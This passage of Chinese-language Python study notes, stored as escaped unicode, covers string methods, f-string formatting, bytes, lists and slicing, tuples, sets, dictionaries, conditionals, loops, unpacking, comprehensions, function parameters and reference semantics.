\"...\".strip()\uff1a\u5220\u9664\u5b57\u7b26\u4e32\u9996\u5c3e\u7a7a\u767d\uff08\u5305\u542b\u7a7a\u683c\u548c\u5236\u8868\u7b26\uff09 \"...\".lstrip()\u3001\"...\".rstrip()\uff1a\u5220\u9664\u5de6\u3001\u53f3\u7aef\u7a7a\u767d \"...\".split(c)\uff1a\u6839\u636e\u5b57\u7b26 c \u6765\u62c6\u5206\u5b57\u7b26\u4e32\u5f97\u5230\u5217\u8868\uff0c\u9ed8\u8ba4\u62c6\u5206\u7a7a\u767d f-string \u00b6 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u65b9\u5f0f\uff1a\"...\" % ...\uff0c\"...\".format(...)\uff0cf\"...\" \u5b57\u7b26\u4e32\u5185\u5927\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u8ba1\u7b97\u540e\u8f6c\u4e3a\u5b57\u7b26\u4e32\u586b\u5165 f\"...{...}...\" \u5982\u679c\u5b57\u7b26\u4e32\u8981\u7528\u5927\u62ec\u53f7\u539f\u59cb\u5b57\u7b26\u8981\u5199\u4e24\u4e2a f\"...{{...\" \u683c\u5f0f\u5316\uff08\u5728\u586b\u5165\u5185\u5bb9\u540e\u9762\u52a0\u5192\u53f7 f\"...{\u8868\u8fbe\u5f0f:\u683c\u5f0f}...\"\uff09 \u5bbd\u5ea6\u586b\u5145\uff1a:[\u586b\u5145\u5b57\u7b26][\u5bf9\u9f50\u65b9\u5f0f][\u5bbd\u5ea6]\uff0c< \u5de6\u5bf9\u9f50\uff0c> \u53f3\u5bf9\u9f50\uff0c^ \u5c45\u4e2d \u5b57\u7b26\u622a\u65ad\uff1a:[...].n\uff0c\u53ea\u663e\u793a\u5b57\u7b26\u4e32\u7684\u524d n \u4e2a\u5b57\u7b26 \u6570\u503c\u7b26\u53f7\uff1a:+ \u6b63\u6570\u52a0\u6b63\u53f7\u3001\u8d1f\u6570\u52a0\u8d1f\u53f7\uff0c:- \u539f\u6837\uff0c: \uff08\u7a7a\u683c\uff09\u6b63\u6570\u52a0\u7a7a\u683c\u3001\u8d1f\u6570\u52a0\u8d1f\u53f7 \u6570\u503c\u7cbe\u5ea6\uff1a:[\u5bbd\u5ea6][\u5206\u9694\u7b26(,_)].[\u7cbe\u5ea6]f\uff0c\u6ca1\u6709\u7cbe\u5ea6\u9ed8\u8ba4\u4e3a 6 \u8fdb\u5236\u663e\u793a\uff1ax \u5c0f\u5199\u5341\u516d\u8fdb\u5236\uff0cX \u5927\u5199\u5341\u516d\u8fdb\u5236\uff0co \u516b\u8fdb\u5236\uff0cb \u4e8c\u8fdb\u5236\uff0c\u52a0 # \u663e\u793a\u524d\u7f00 \u5b57\u8282\u7c7b\u578b \u00b6 \u7c7b\u4f3c\u5b57\u7b26\u4e32\uff0c\u4f46\u5b58\u50a8\u7684\u662f\u5b57\u8282\u7684\u503c\uff0c\u66f4\u50cf\u5217\u8868\uff0c\u663e\u793a\u4e3a b\"...\" \u53ea\u662f\u66f4\u52a0\u6613\u8bfb\u800c\u5df2 b\"...\" \u5219\u8868\u793a\u5b57\u8282\u7c7b\u578b\uff0c\u5176\u4e2d\u53ea\u80fd\u5305\u542b ASCII \u5b57\u7b26\u548c \\x.. \u8868\u793a\u7684\u5341\u516d\u8fdb\u5236\u6570 \u4e0e\u5b57\u7b26\u4e32\u8f6c\u6362 \"...\".encode(encoding) \u6839\u636e encoding \u7f16\u7801\u5b57\u7b26\u4e32\uff0c\u9ed8\u8ba4 UTF-8 bytes_obj.decode(encoding) \u6839\u636e encoding \u89e3\u7801\u5b57\u8282\u5e8f\u5217\uff0c\u89e3\u7801\u5931\u8d25\u4f1a\u62a5\u9519 bytes(\"...\", encoding) \u4e5f\u662f\u6839\u636e encoding \u7f16\u7801\u5b57\u7b26\u4e32 \u4e0d\u8981\u4f7f\u7528 str(b\"...\") \u6765\u5c06\u5b57\u8282\u5e8f\u5217\u8f6c\u4e3a\u5b57\u7b26\u4e32 \u5e03\u5c14\u7c7b\u578b \u00b6 True \u548c False\uff0c\u8bb0\u4f4f\u9996\u5b57\u6bcd\u5927\u5199 \u7528 bool(...) \u6765\u8f6c\u6362\uff0c\u5982\u679c\u662f\u6570\u5b57\u5219\u975e\u96f6\u90fd\u662f True\uff0c\u5982\u679c\u662f\u5b57\u7b26\u4e32\u5219\u975e\u7a7a\u90fd\u662f True \u8fd0\u7b97 \u53ef\u4ee5\u4f7f\u7528 & | \u6765\u8868\u793a\u4e0e\u548c\u6216\uff08\u4f46\u5e76\u4e0d\u4f1a\u77ed\u8def\uff09 \u4e00\u822c\u4f7f\u7528 and or not \u8fdb\u884c\u4e0e/\u6216/\u975e\u8fd0\u7b97\uff08\u4f1a\u77ed\u8def\uff09 \u5217\u8868 \u00b6 \u7c7b\u4f3c\u5176\u5b83\u8bed\u8a00\u7684\u6570\u7ec4\uff0c\u4f46\u662f\u529f\u80fd\u66f4\u591a\uff0c\u800c\u4e14\u5185\u90e8\u5143\u7d20\u4e0d\u8981\u6c42\u540c\u4e00\u7c7b\u578b \u65b9\u62ec\u53f7 [] \u8868\u793a\u5217\u8868\uff0c\u5143\u7d20\u7528\u9017\u53f7\u5206\u9694 \u7d22\u5f15\uff08\u5373\u4e0b\u6807\uff09\u4ece 0 \u5f00\u59cb\u8ba1\u6570\uff0clst[n] \u5373\u8868\u793a\u8bbf\u95ee\u7b2c n+1 \u4e2a\u5143\u7d20 \u7d22\u5f15\u53ef\u4ee5\u662f\u8d1f\u6570\uff0c\u8d1f\u6570\u5373\u8868\u793a\u5012\u6570\uff0c\u4f8b lst[-2] \u8868\u793a\u5012\u6570\u7b2c\u4e8c\u4e2a\u5143\u7d20 \u5207\u7247\uff08\u83b7\u53d6\u5217\u8868\u4e2d\u7684\u4e00\u90e8\u5206\u503c\uff09 lst[a:b]\uff1a\u4ece lst[a] \u5230 lst[b-1] \u7684\u5217\u8868 lst[:b]\uff1a\u4ece\u5f00\u5934\u5230 lst[b-1] \u7684\u5217\u8868 lst[a:]\uff1a\u4ece lst[a] \u5230\u7ed3\u5c3e\u7684\u5217\u8868 lst[:]\uff1a\u8868\u793a\u6574\u4e2a\u5217\u8868\uff08\u62f7\u8d1d\u4e00\u4efd\uff09 lst[a:b:c]\uff1a\u4ece lst[a] \u5230 lst[b-1] \u6bcf c \u4e2a\uff08\u5373\u6b65\u957f\uff09\u53d6\u4e00\u4e2a\u5f62\u6210\u7684\u5217\u8868 c \u53ef\u4ee5\u662f\u8d1f\u6570\uff0c\u6b64\u65f6\u9700\u8981 a > b \u624d\u80fd\u83b7\u53d6\u5230\u503c \u6709\u6b65\u957f\u65f6\u82e5\u7701\u7565 a\u3001b \u8bb0\u5f97\u4e0d\u8981\u7701\u7565\u5192\u53f7\uff0c\u4f8b lst[::-1] \u8868\u793a\u5217\u8868\u5012\u5e8f \u5217\u8868\u64cd\u4f5c \u00b6 \u4fee\u6539\u5143\u7d20\uff1a\u76f4\u63a5\u901a\u8fc7\u7d22\u5f15/\u5207\u7247\uff0c\u7136\u540e\u7b49\u53f7\u8d4b\u503c \u6709\u6808\u7684\u529f\u80fd lst.append(...) \u5728\u5217\u8868\u672b\u5c3e\u52a0\u5165\u5143\u7d20 lst.pop() \u5f39\u51fa\u5217\u8868\u672b\u5c3e\u5143\u7d20\u5e76\u8fd4\u56de \u4efb\u610f\u4f4d\u7f6e\u63d2\u5165\u5f39\u51fa lst.insert(i, x) \u5728\u7d22\u5f15 i \u7684\u4f4d\u7f6e\u63d2\u5165 x\uff0c\u540e\u9762\u4f9d\u6b21\u540e\u79fb lst.pop(i) \u5f39\u51fa\u7d22\u5f15 i \u4f4d\u7f6e\u7684\u5143\u7d20\uff0c\u540e\u9762\u4f9d\u6b21\u524d\u79fb \u5217\u8868\u62fc\u63a5 \u76f4\u63a5\u76f8\u52a0\uff0c\u4e0d\u6539\u53d8\u539f\u5217\u8868\uff0c\u5f97\u5230\u65b0\u7684\u5217\u8868 lst.extend([...])\uff0c\u628a\u4e00\u4e2a\u5217\u8868\u63a5\u5230\u5f53\u524d\u5217\u8868\u540e\u9762 \u6839\u636e\u503c\u5220\u9664\u5143\u7d20 lst.remove(value) \u5220\u9664\u7b2c\u4e00\u4e2a\u503c\u4e3a value \u7684\u5143\u7d20 \u6392\u5e8f\u5217\u8868 lst.sort() \u6c38\u4e45\u6392\u5e8f\uff08\u5373\u6392\u5e8f\u540e\u8d4b\u503c\u7ed9\u5f53\u524d\u5217\u8868\uff09 sorted(lst) \u4e34\u65f6\u6392\u5e8f\uff0c\u8fd4\u56de\u6392\u5e8f\u597d\u7684\u65b0\u5217\u8868 \u9ed8\u8ba4\u4ece\u5c0f\u5230\u5927\uff0c\u5982\u679c\u4f20\u5165 reverse=True \u5219\u4ece\u5927\u5230\u5c0f \u53cd\u8f6c\u5217\u8868 lst.reverse() \u6c38\u4e45\u53cd\u8f6c\uff08\u610f\u4e49\u540c\u4e0a\uff09 lst[::-1] \u8fd4\u56de\u53cd\u8f6c\u7684\u5217\u8868\uff08\u5229\u7528\u524d\u9762\u8bf4\u5230\u7684\u5207\u7247\uff09 \u7edf\u8ba1\u64cd\u4f5c len(lst) \u5f97\u5230\u5217\u8868\u7684\u957f\u5ea6 sum(lst) \u5f97\u5230\u5217\u8868\u7684\u5143\u7d20\u548c\uff08\u672c\u8d28\u4e0a\u662f\u5c06 start \u53c2\u6570\u548c\u6bcf\u4e2a\u5143\u7d20\u4f9d\u6b21\u76f8\u52a0\uff09 \u53ef\u4ee5\u4f20\u5165 start \u53c2\u6570\u7528\u6765\u6307\u5b9a\u52a0\u548c\u7684\u8d77\u59cb\u503c max(lst) \u5f97\u5230\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c min(lst) \u5f97\u5230\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c \u5143\u7ec4 \u00b6 \u53ef\u4ee5\u770b\u6210\u5143\u7d20\u4e0d\u53ef\u53d8\u7684\u5217\u8868\uff0c\u5185\u90e8\u4e5f\u53ef\u4ee5\u5305\u542b\u4e0d\u540c\u7c7b\u578b\u7684\u5143\u7d20 \u62ec\u53f7\u8868\u793a\u5143\u7ec4\uff0c\u5185\u90e8\u5143\u7d20\u95f4\u7528\u9017\u53f7\u5206\u9694 \u53ef\u4ee5\u4f7f\u7528\u548c\u5217\u8868\u4e00\u6837\u7684\u65b9\u6cd5\u6765\u8bfb\u53d6\u5143\u7d20\uff0c\u4f46\u5e76\u4e0d\u80fd\u4fee\u6539 \u5f53\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\u7684\u65f6\u5019\u8981\u5199\u6210 (a,) \u800c\u4e0d\u662f (a)\uff08\u540e\u8005\u662f\u5355\u4e2a\u503c\uff09 \u53ef\u4ee5\u4f7f\u7528 tuple(...) \u6765\u5c06\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff08\u5217\u8868\u3001\u5b57\u7b26\u4e32\u7b49\uff09\u8f6c\u4e3a\u5143\u7ec4 \u5143\u7ec4\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u5143\u7d20\u5b8c\u5168\u4e0d\u53ef\u53d8 \u907f\u514d\u5728\u5143\u7ec4\u4e2d\u5b58\u653e\u53ef\u53d8\u5143\u7d20 \u96c6\u5408 \u00b6 \u5927\u62ec\u53f7\u62ec\u8d77\u6765\uff0c\u5185\u90e8\u5143\u7d20\u95f4\u7528\u9017\u53f7\u5206\u9694\uff0c\u4f1a\u81ea\u52a8\u53bb\u91cd \u53ef\u7528 set(...) \u6765\u5c06\u53ef\u8fed\u4ee3\u5bf9\u8c61\u8f6c\u4e3a\u5143\u7ec4\uff0c\u81ea\u52a8\u53bb\u91cd \u96c6\u5408\u4e2d\u4e0d\u80fd\u5305\u542b\u5217\u8868\u7b49\u4e0d\u53ef hash \u5316\u7684\u5143\u7d20 \u4fee\u6539 s.add(...) \u6765\u52a0\u5165\u4e00\u4e2a\u5143\u7d20 s.remove(...) \u5220\u9664\u4e00\u4e2a\u5143\u7d20\uff0c\u5982\u679c\u6ca1\u6709\u4f1a\u629b\u51fa\u5f02\u5e38 s.discard(...) \u6765\u5220\u9664\u4e00\u4e2a\u5143\u7d20\uff0c\u5982\u679c\u6ca1\u6709\u5219\u5ffd\u7565 \u8fd0\u7b97 s1 & s2\u3001s1 | s2\u3001s1 - s2 \u4ea4\u96c6\u3001\u5e76\u96c6\u3001\u5dee\u96c6 s1 ^ s2 \u5bf9\u79f0\u5dee\u96c6 \u5b57\u5178 \u00b6 \u5b58\u50a8\u952e\u503c\u5bf9\uff0c\u4e5f\u662f\u5927\u62ec\u53f7\u62ec\u8d77\u6765\uff0c\u4e0d\u8fc7\u9017\u53f7\u5206\u9694\u7684\u662f\u952e\u503c\u5bf9 {key: value, ...} {} \u662f\u7a7a\u5b57\u5178\u800c\u4e0d\u662f\u7a7a\u96c6\u5408 \u901a\u8fc7 d[key] \u6765\u8bbf\u95ee\u5b57\u5178\u4e2d key \u5bf9\u5e94\u7684\u503c\uff0c\u53ef\u4ee5\u8bfb\u53d6\u3001\u4fee\u6539 \u6dfb\u52a0\u952e\u503c\u5bf9\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 d[key] = value \u6765\u8fdb\u884c \u5220\u9664\u952e\u503c\u5bf9\u53ef\u4ee5\u76f4\u63a5 del d[key] \u901a\u8fc7 d[key] \u8bbf\u95ee\u503c\u65f6\u5982\u679c\u4e0d\u5b58\u5728 key \u8fd9\u4e2a\u952e\u4f1a\u629b\u51fa\u5f02\u5e38 \u901a\u8fc7 d.get(key) \u6765\u8bbf\u95ee\u503c\u65f6\u5982\u679c\u4e0d\u5b58\u5728\u5219\u4f1a\u8fd4\u56de None \u4f7f\u7528 d.get(key, default) \u5982\u679c\u6ca1\u6709 key \u65f6\u4f1a\u8fd4\u56de default \u503c d.update(d2) \u6765\u7528 d2 \u4e2d\u7684\u952e\u503c\u5bf9\u66f4\u65b0 d \u6761\u4ef6\u5206\u652f \u00b6 \u5e03\u5c14\u8868\u8fbe\u5f0f \u00b6 == \u5224\u65ad\u76f8\u7b49\uff08\u76f8\u7b49\u5219\u8fd4\u56de True\uff09\uff0c != \u5224\u65ad\u4e0d\u7b49 \u4f7f\u7528 and or not \u6765\u8fdb\u884c\u5e03\u5c14\u8fd0\u7b97\uff0c\u5fc5\u8981\u65f6\u52a0\u62ec\u53f7\u4fdd\u8bc1\u4f18\u5148\u7ea7 \u6570\u503c\u6bd4\u8f83\u5927\u5c0f < <= > >= \u5224\u65ad\u5143\u7d20\u662f\u5426\u5728\u5217\u8868\u4e2d value in lst\uff1a\u5982\u679c\u5728\u5219\u503c\u4e3a True value not in lst\uff1a\u5982\u679c\u5728\u5219\u4e3a False\uff08\u5224\u65ad\u662f\u5426\u4e0d\u5728\uff09 \u5224\u65ad\u952e\u662f\u5426\u5728\u5b57\u5178\u4e2d key in d\u3001key not in d \u4e0e\u5217\u8868\u540c\u7406 \u6761\u4ef6\u8bed\u53e5 \u00b6 if-elif-else \u7ed3\u6784\uff08\u4e0d\u662f else if\uff09 elif\u3001else \u5747\u53ef\u4ee5\u7701\u7565 \u6761\u4ef6\u4e0d\u9700\u8981\u52a0\u62ec\u53f7\uff08\u52a0\u4e86\u4e5f\u6ca1\u95ee\u9898\uff09 condition \u4f1a\u88ab\u8f6c\u6362\u6210 bool \u7c7b\u578b\u7136\u540e\u5224\u65ad \u6ce8\u610f\u7f29\u8fdb \u7c7b\u4e09\u76ee\u8fd0\u7b97\u7b26\u5199\u6cd5 a if condition else b \u7c7b\u4f3c\u5176\u5b83\u8bed\u8a00\u4e2d\u7684 condition? a : b if condition1 : ... elif condition2 : ... elif condition3 : ... else : ... \u7f29\u8fdb \u00b6 \u7f29\u8fdb\u662f python \u4e2d\u5f88\u91cd\u8981\u7684\u4e1c\u897f\uff0cpython \u9760\u7f29\u8fdb\u6765\u5f97\u5230\u4ee3\u7801\u7ed3\u6784\uff0c\u800c\u4e0d\u662f\u5927\u62ec\u53f7 \u7f29\u8fdb\u53ef\u4ee5\u4f7f\u7528\u7a7a\u683c\u6216\u5236\u8868\u7b26 \u5982\u679c\u4e00\u4e9b\u4ee3\u7801\u5904\u4e8e\u540c\u4e00\u5c42\u7f29\u8fdb\u4e0b\uff0c\u5219\u5c5e\u4e8e\u540c\u4e00\u4e2a\u4ee3\u7801\u5757 \u540c\u4e00\u4e2a\u4ee3\u7801\u5757\u7684\u7f29\u8fdb\u8981\u7edf\u4e00 \u4e0d\u4ec5\u4ec5\u662f\u770b\u7740\u50cf\uff0c\u8981\u533a\u5206\u597d\u7a7a\u683c\u4e0e\u5236\u8868\u7b26 4 \u4e2a\u7a7a\u683c\u4e0e\u4e00\u4e2a\u663e\u793a\u5bbd\u5ea6\u4e3a 4 \u7684\u5236\u8868\u7b26\u5e76\u4e0d\u662f\u540c\u4e00\u7f29\u8fdb \u4e00\u822c\u4f7f\u7528 4 \u7a7a\u683c\u7f29\u8fdb\uff0c\u6216\u8005 1 \u5236\u8868\u7b26\u7f29\u8fdb \u7f16\u8f91\u5668\u4e2d\u6309 Tab \u6253\u51fa\u7684\u4e5f\u4e0d\u4e00\u5b9a\u662f\u5236\u8868\u7b26\uff0c\u8981\u5206\u6e05 \u7f29\u8fdb\u4e0d\u6b63\u786e\u4f1a\u62a5 IndentationError\uff0c\u6b64\u65f6\u6ce8\u610f\u68c0\u67e5\u7f29\u8fdb \u5faa\u73af \u00b6 for \u5faa\u73af \u00b6 python \u4e2d\u7684 for \u5faa\u73af\u5e76\u4e0d\u50cf c \u4e2d\u662f\u6307\u5b9a\u4e00\u4e2a\u53d8\u91cf\u7684\u53d8\u5316\u65b9\u5f0f\uff0c\u800c\u662f\u4ece\u5217\u8868/\u5143\u7ec4/\u8fed\u4ee3\u5668\u7b49\u53ef\u8fed\u4ee3\u5bf9\u8c61\u4e2d\u904d\u5386\u503c for \u5faa\u73af\u4f1a\u4ea7\u751f\u4e00\u4e2a\u7528\u4e8e\u5faa\u73af\u7684\u53d8\u91cf\uff0c\u8fd9\u4e2a\u53d8\u91cf\u5728\u5faa\u73af\u7ed3\u675f\u540e\u5e76\u4e0d\u4f1a\u5220\u9664\uff0c\u800c\u662f\u4fdd\u7559\u6700\u540e\u4e00\u6b21\u7684\u503c \u53ef\u4ee5\u4f7f\u7528 range \u6765\u751f\u6210\u4e00\u4e32\u6570\u5b57\u7528\u6765\u5faa\u73af range(a, b) \u751f\u6210\u4ece a \u5230 b-1 \u7684\u8fde\u7eed\u6574\u6570 range(a, b, c) \u4ee5 c \u4e3a\u6b65\u957f\u751f\u6210 range \u5f97\u5230\u7684\u5e76\u4e0d\u662f\u5217\u8868\uff0c\u5982\u679c\u8981\u7528\u5176\u751f\u6210\u5217\u8868\u8981\u4f7f\u7528 list(range(...)) for value in lst : ... for value in range ( ... ): ... for \u5faa\u73af\u904d\u5386\u5b57\u5178 \u00b6 \u6709\u4e09\u79cd\u65b9\u6cd5\u6765\u904d\u5386\u5b57\u5178 \u5728 d.keys() \u4e2d\u5faa\u73af\u904d\u5386\u6240\u6709\u952e \u5728 d.values() \u4e2d\u5faa\u73af\u904d\u5386\u6240\u6709\u503c \u5728 d.items() \u4e2d\u904d\u5386\u952e\u503c\u5bf9\uff08\u9700\u8981\u89e3\u5305\uff09 for key in d . keys (): ... for value in d . values (): ... for item in d . items (): ... # item \u4e3a\u4e00\u4e2a\u5143\u7ec4 for key , value in d . items (): ... # \u5c06 item \u89e3\u5305 \u5143\u7d20\u89e3\u5305 \u00b6 \u8d4b\u503c\u65f6\u7b49\u53f7\u5de6\u4fa7\u53ef\u4ee5\u662f\u7528\u9017\u53f7\u5206\u9694\u7684\u591a\u4e2a\u503c\uff0c\u8fd9\u65f6\u4f1a\u5c06\u53f3\u4fa7\u89e3\u5305\u5206\u522b\u8d4b\u503c\u7ed9\u5de6\u4fa7\u7684\u5404\u4e2a\u53d8\u91cf \u53f3\u4fa7\u4e5f\u53ef\u4ee5\u662f\u591a\u4e2a\u503c\uff08\u53ea\u8981\u51fa\u73b0\u9017\u53f7\u5c31\u4f1a\u89c6\u4e3a\u4e00\u4e2a\u5143\u7ec4\uff09 \u53ef\u4ee5\u901a\u8fc7 a, b = b, a \u5b9e\u73b0\u5143\u7d20\u4ea4\u6362 \u661f\u53f7\u8868\u8fbe\u5f0f \u53ef\u4ee5\u7528\u6765\u5728\u53ef\u8fed\u4ee3\u5bf9\u8c61\u5185\u90e8\u89e3\u5305 \u4e5f\u53ef\u7528\u6765\u6807\u8bb0\u4e00\u4e2a\u53d8\u91cf\u5305\u542b\u591a\u4e2a\u503c for \u5faa\u73af\u53ef\u4ee5\u89e3\u5305 t = ( 1 , 2 , 3 ) a , b , c = t # a = 1, b = 2, c = 3 t = ( 1 , 2 , ( 3 , 4 )) a , b , ( c , d ) = t # c = 3, d = 4 l = [ 1 , 2 , * [ 3 , 4 ]] # [3, 4] \u88ab\u89e3\u5305 ## l = [1, 2, 3, 4] a , * b = [ 1 , 2 , 3 , 4 ] ## a = 1, b = [2, 3, 4] lst = [[ 1 , 2 ], [ 3 , 4 ]] for a , b in lst : ... # \u7b2c\u4e00\u6b21\u5faa\u73af a, b \u4e3a 1, 2 # \u7b2c\u4e8c\u6b21\u5faa\u73af a, b \u4e3a 3, 4 for \u5faa\u73af\u6280\u5de7 \u00b6 enumerate \u8ba1\u6570 \u53ef\u4ee5\u6307\u5b9a\u521d\u59cb\u503c zip \u540c\u65f6\u5faa\u73af\u591a\u4e2a\u53ef\u8fed\u4ee3\u5bf9\u8c61 \u5faa\u73af\u6b21\u6570\u4e3a\u6700\u77ed\u7684\u5bf9\u8c61\u7684\u957f\u5ea6 for i , value in enumerate ( lst ): ... # i \u4f9d\u6b21\u4e3a 0\uff0c1\uff0c2\uff0c\u2026\u2026 for i , value in enumerate ( lst , 1 ): ... # i \u4f9d\u6b21\u4e3a 1\uff0c2\uff0c3\uff0c\u2026\u2026 for a , b in zip ( lst1 , lst2 ): ... # a \u5728 lst1 \u4e2d\u5faa\u73af # b \u5728 lst2 \u4e2d\u5faa\u73af \u5217\u8868\u63a8\u5bfc \u00b6 \u4e00\u79cd\u5f88\u65b9\u4fbf\u7684\u751f\u6210\u5217\u8868\u7684\u65b9\u5f0f \u5373\u5728\u5217\u8868\u4e2d\u5305\u542b\u5faa\u73af\uff0c\u9010\u6b21\u8bb0\u5f55\u5faa\u73af\u524d\u8868\u8fbe\u5f0f\u7684\u503c \u53ef\u4ee5\u6709\u591a\u91cd\u5faa\u73af\uff0c\u5373\u751f\u6210\u7b1b\u5361\u5c14\u79ef \u53ef\u4ee5\u5305\u542b\u6761\u4ef6\uff0c\u5373\u5728\u6761\u4ef6\u6210\u7acb\u65f6\u624d\u8bb0\u5f55\u503c \u5217\u8868\u63a8\u5bfc\u4e2d\u7684\u5faa\u73af\u53d8\u91cf\u6709\u5c40\u90e8\u4f5c\u7528\u57df \u5373\u5728\u5217\u8868\u63a8\u5bfc\u5916\u4e0d\u80fd\u8bbf\u95ee\u5faa\u73af\u53d8\u91cf lst = [] for i in range ( 1 , 10 ): lst . append ( i ** 2 ) ## \u7b49\u4ef7\u4e8e lst = [ i ** 2 for i in range ( 1 , 10 )] lst1 = [ x * y for x in l1 for y in l2 ] lst2 = [ ... for ... in ... if ... ] \u751f\u6210\u5143\u7ec4/\u5b57\u5178 \u00b6 \u53ef\u4ee5\u4f7f\u7528\u548c\u5217\u8868\u63a8\u5bfc\u7c7b\u4f3c\u7684\u65b9\u6cd5\u751f\u6210\u5143\u7ec4\u548c\u5b57\u5178 \u751f\u6210\u5143\u7ec4\u7684\u65f6\u5019\u8981\u7528 tuple() \u53ea\u5199 () \u7684\u8bdd\u5219\u53ea\u662f\u751f\u6210\u5668\u8868\u8fbe\u5f0f \u751f\u6210\u5b57\u5178\u65f6\u5faa\u73af\u524d\u7528 : \u5c06\u952e\u503c\u9694\u5f00 tuple ( i ** 2 for i in range ( 1 , 10 )) ( i ** 2 for i in range ( 1 , 10 )) ## ^ generator object { a : b for a in ... for b in ... } \u63a7\u5236\u5faa\u73af \u00b6 \u548c\u5176\u5b83\u8bed\u8a00\u4e00\u6837\uff0c\u5728\u5faa\u73af\u4ee3\u7801\u5757\u4e2d\u53ef\u4ee5\u63a7\u5236\u5faa\u73af\u7684\u8fdb\u884c break \u7acb\u523b\u7ed3\u675f\u5faa\u73af continue \u7acb\u523b\u8fdb\u884c\u4e0b\u4e00\u8f6e\u5faa\u73af while \u5faa\u73af \u00b6 while \u5faa\u73af\u5373\u8fdb\u884c\u6761\u4ef6\u68c0\u67e5\uff0c\u5982\u679c\u4e3a True \u5219\u7ee7\u7eed\u8fd0\u884c\u76f4\u5230\u6761\u4ef6\u4e0d\u6ee1\u8db3\u505c\u6b62 while condition : ... \u51fd\u6570 \u00b6 \u51fd\u6570\u5b9a\u4e49 \u00b6 \u4f7f\u7528 def \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u51fd\u6570 \u5148\u51fd\u6570\u540d\uff0c\u7136\u540e\u62ec\u53f7\u5217\u51fa\u53c2\u6570\uff0c\u4e0b\u9762\u63a5\u4ee3\u7801\u5757 \u4f7f\u7528 return \u8fd4\u56de \u6ca1\u6709 return \u8fd0\u884c\u5230\u7ed3\u5c3e\uff0c\u8fd4\u56de None \u53ea\u6709 return\uff0c\u8fd4\u56de None return \u540e\u63a5\u5185\u5bb9\uff0c\u8fd4\u56de\u5185\u5bb9 return \u7684\u503c\u7c7b\u578b\u4e0d\u8981\u6c42\u4e00\u81f4 return \u53ef\u4ee5\u8fd4\u56de\u591a\u4e2a\u503c\uff08\u5229\u7528\u5143\u7ec4\uff09 def func_name ( arg1 , arg2 ): ... def func_name ( arg1 , arg2 ): ... return ... def func_name ( arg1 , arg2 ): ... return ... , ... \u51fd\u6570\u53c2\u6570 \u00b6 \u62ec\u53f7\u4e2d\u8981\u5217\u51fa\u53c2\u6570\u540d\uff0c\u4f9b\u51fd\u6570\u4f53\u5185\u4f7f\u7528 \u53ef\u4ee5\u5728\u53c2\u6570\u540e\u63a5\u7b49\u53f7\u8d4b\u9ed8\u8ba4\u503c \u4f7f\u7528\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u5728\u8c03\u7528\u65f6\u53ef\u4ee5\u4e0d\u7528\u4f20 \u5229\u7528 * \u6765\u63a5\u6536\u4efb\u610f\u591a\u53c2\u6570 \u63a5\u6536\u8fdb\u6765\u662f\u4e00\u4e2a\u5143\u7ec4 * \u53c2\u6570\u540e\u9762\u4e0d\u80fd\u518d\u6709\u5176\u5b83\u975e\u5173\u952e\u5b57\u53c2\u6570 \u5229\u7528 ** \u6765\u63a5\u6536\u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570 \u63a5\u6536\u8fdb\u6765\u662f\u4e00\u4e2a\u5b57\u5178 def func ( arg1 , arg2 ): ... def func ( arg1 , arg2 = \"...\" ): # \u9ed8\u8ba4\u503c ... def func ( arg1 , * arg2 ): # \u4efb\u610f\u591a\u53c2\u6570 ... def func ( arg1 , ** arg2 ): # \u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570 ... def func ( arg1 , * arg2 , ** arg3 ): ... # *arg2 \u540e\u53ef\u4ee5\u52a0 **arg3 \u51fd\u6570\u8c03\u7528 \u00b6 \u901a\u8fc7 \u51fd\u6570\u540d(\u53c2\u6570) \u6765\u8c03\u7528\u51fd\u6570\uff0c\u5f97\u5230\u8fd4\u56de\u503c \u76f4\u63a5\u4f20\u53c2\u7684\u8bdd\u8981\u5c06\u53c2\u6570\u4e0e\u5b9a\u4e49\u5bf9\u5e94\u4e0a \u901a\u8fc7\u5173\u952e\u5b57\u4f20\u53c2\uff08\u53c2\u6570\u540d\uff09\u53ef\u4ee5\u6253\u4e71\u987a\u5e8f \u5e26\u6709\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u5982\u679c\u4e0d\u4f20\u5219\u4f7f\u7528\u9ed8\u8ba4\u503c \u5982\u679c\u8bfb\u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570\uff0c\u5219\u591a\u4f59\u7684\u8bfb\u5230\u5b57\u5178\u4e2d def func ( a , b ): ... func ( 1 , 2 ) # a = 1, b = 2 func ( b = 1 , a = 2 ) # a = 2, b = 1 def func2 ( a , ** b ): ... func2 ( a = 1 , b = 2 , c = 3 ) ## a = 1, b = {\"b\": 2, \"c\": 3} *\u5f15\u7528\u53d8\u91cf \u00b6 python \u4e2d\u7684\u53d8\u91cf\u90fd\u662f\u5f15\u7528\u7684\uff08\u8fd9\u4e5f\u5c31\u662f\u4e3a\u4ec0\u4e48\u524d\u9762\u8bf4\u4e0d\u8981\u5c06\u53d8\u91cf\u7406\u89e3\u4e3a\u76d2\u5b50\uff09 \u7528 = \u5b9e\u9645\u4e0a\u662f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u522b\u540d lst1 = lst2\uff0c\u5219 lst1 \u548c lst2 \u4f1a\u540c\u65f6\u53d8\u5316\uff08\u8981\u7528 [:] \u521b\u5efa\u526f\u672c\uff09 \u6570\u503c\u7c7b\u578b\u6709\u4f18\u5316\uff0c\u6240\u4ee5\u4e0d\u4f1a\u8fd9\u6837 == \u68c0\u67e5\u503c\u662f\u5426\u76f8\u7b49\uff0cis \u68c0\u67e5\u503c\u662f\u5426\u76f8\u540c \u89c2\u5bdf pythontutor.com \u51fd\u6570\u53c2\u6570\u4f20\u9012\u53ea\u6709\u201c\u5171\u4eab\u4f20\u53c2\u201d\u4e00\u79cd\u5f62\u5f0f\uff08\u5373\u4f20\u5f15\u7528\uff09 